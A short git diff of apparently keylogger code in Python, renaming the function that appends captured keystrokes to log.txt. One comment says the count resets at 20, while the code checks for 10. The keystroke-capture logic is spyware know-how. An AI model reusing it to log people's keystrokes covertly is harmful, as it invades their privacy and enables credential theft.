@@ -15,13 +15,13 @@ def on_press(key):
     # if count is greater than / equal to 20, reset count and keys #
     if count >= 10:
         count = 0
-        write_file(keys)
+        writeToFile(keys)
         keys = []
 
 
-# define function write_file, which takes argument 'keys' and #
+# define function writeToFile, which takes argument 'keys' and #
 # appends ('a') to log.txt, and replaces some things for clarity #
-def write_file(keys):
+def writeToFile(keys):
     with open("log.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
